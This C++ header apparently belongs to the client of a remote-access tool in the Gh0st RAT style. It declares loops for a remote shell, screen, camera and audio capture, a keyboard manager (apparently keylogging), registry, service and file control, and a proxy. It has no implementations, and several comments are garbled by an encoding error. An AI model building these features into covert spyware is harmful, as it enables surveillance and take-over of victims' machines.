#pragma once
#include "StdAfx.h"
#include "IOCPClient.h"
#include "common/commands.h"

typedef struct _THREAD_ARG_LIST
{
	DWORD (WINAPI *StartAddress)(LPVOID lParameter);  
	LPVOID  lParam;
	bool	bInteractive; // �Ƿ�֧�ֽ�������  ??
	HANDLE	hEvent;
}THREAD_ARG_LIST, *LPTHREAD_ARG_LIST;

typedef struct UserParam
{
	BYTE* buffer;
	int length;
	~UserParam() { SAFE_DELETE_ARRAY(buffer); }
}UserParam; 

// д������
bool WriteAppSettingA(const std::string& keyName, const std::string& value);
// ��ȡ����
bool ReadAppSettingA(const std::string& keyName, std::string& outValue);

DWORD WINAPI ThreadProc(LPVOID lParam);

DWORD WINAPI LoopShellManager(LPVOID lParam);
DWORD WINAPI LoopScreenManager(LPVOID lParam);
DWORD WINAPI LoopFileManager(LPVOID lParam);
DWORD WINAPI LoopTalkManager(LPVOID lParam);
DWORD WINAPI LoopProcessManager(LPVOID lParam);
DWORD WINAPI LoopWindowManager(LPVOID lParam);
DWORD WINAPI LoopVideoManager(LPVOID lParam);
DWORD WINAPI LoopAudioManager(LPVOID lParam);
DWORD WINAPI LoopRegisterManager(LPVOID lParam);
DWORD WINAPI LoopServicesManager(LPVOID lParam);
DWORD WINAPI LoopKeyboardManager(LPVOID lParam);
DWORD WINAPI LoopProxyManager(LPVOID lParam);
